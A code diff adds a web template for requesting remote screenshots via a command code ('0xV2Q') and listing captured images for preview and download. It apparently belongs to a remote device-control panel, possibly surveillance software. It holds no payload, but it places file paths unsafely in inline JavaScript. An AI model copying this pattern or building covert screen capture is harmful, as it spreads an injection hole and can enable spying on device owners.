@@ -1,0 +1,110 @@
+<div class="ui segment">
+    <div>
+        <div class="ui action input fluid">
+            <button onclick="captureScreenshot(this)" class="ui teal left labeled icon button">
+                <i class="camera icon"></i>
+                Capture Screenshot
+            </button>
+        </div>
+        <div class="ui attached progress indicating active" id="ssProg" style="display:none;">
+            <div class="bar"></div>
+        </div>
+    </div>
+
+    <!-- Lightbox modal for full-size preview -->
+    <div class="ui modal" id="ssModal">
+        <div class="content" style="text-align:center; padding: 10px;">
+            <img id="ssModalImg" src="" style="max-width:100%; max-height:80vh; border-radius: 4px;" />
+        </div>
+        <div class="actions">
+            <div class="ui cancel button">Close</div>
+        </div>
+    </div>
+
+    <script>
+        function previewScreenshot(src) {
+            $('#ssModalImg').attr('src', src);
+            $('#ssModal').modal('show');
+        }
+    </script>
+
+    <table class="ui celled table" style="margin-top: 14px;">
+        <thead>
+            <tr>
+                <th>Time</th>
+                <th>Preview</th>
+                <th>Name</th>
+                <th>Actions</th>
+            </tr>
+        </thead>
+        <tbody>
+            <% pageData.forEach((item)=> {
+                let date = new Date(item.time);
+                %>
+                <tr>
+                    <td class="collapsing">
+                        <%= date.toLocaleString('en-GB', { timeZone: 'Asia/Kolkata' }) %>
+                    </td>
+                    <td class="collapsing" style="text-align:center;">
+                        <img src="<%= item.path %>"
+                            style="height:60px; width:auto; cursor:pointer; border-radius:4px; border:1px solid #ddd;"
+                            onclick="previewScreenshot('<%= item.path %>')" title="Click to enlarge" />
+                    </td>
+                    <td>
+                        <%= item.originalName %>
+                    </td>
+                    <td class="collapsing">
+                        <div class="ui buttons">
+                            <button onclick="previewScreenshot('<%= item.path %>')" class="ui button blue">
+                                <i class="eye icon"></i> View
+                            </button>
+                            <div class="or"></div>
+                            <a href="<%= item.path %>" download="<%= item.originalName %>" class="ui positive button">
+                                <i class="download icon"></i> Save
+                            </a>
+                        </div>
+                    </td>
+                </tr>
+                <% }) %>
+        </tbody>
+    </table>
+
+    <script>
+        function captureScreenshot(element) {
+            $(element).addClass('loading');
+            $('#ssProg').show();
+            sendCommand('0xV2Q', {}, (error, message) => {
+                if (error) {
+                    setTimeout(() => {
+                        showNotification('#f03434', error);
+                        $(element).removeClass('loading');
+                        $('#ssProg').hide();
+                    }, 300);
+                } else {
+                    setTimeout(() => {
+                        $(element).removeClass('loading');
+
+                        let timeLeft = 15000;
+                        if (message === 'Requested') {
+                            showNotification('#2ecc71', 'Screenshot requested! Check back in ~15 seconds.');
+                            let cdInterval = setInterval(() => {
+                                timeLeft = timeLeft - 100;
+                                let percent = (((15000) * 100) / timeLeft) - 100;
+                                $('#ssProg').progress({ percent });
+                                if (percent > 100) {
+                                    clearInterval(cdInterval);
+                                    $('#ssProg').hide();
+                                    window.location = window.location;
+                                }
+                            }, 100);
+                        } else {
+                            showNotification('#2ecc71', message);
+                            $('#ssProg').hide();
+                        }
+                    }, 300);
+                }
+            });
+        }
+    </script>
+
+</div>
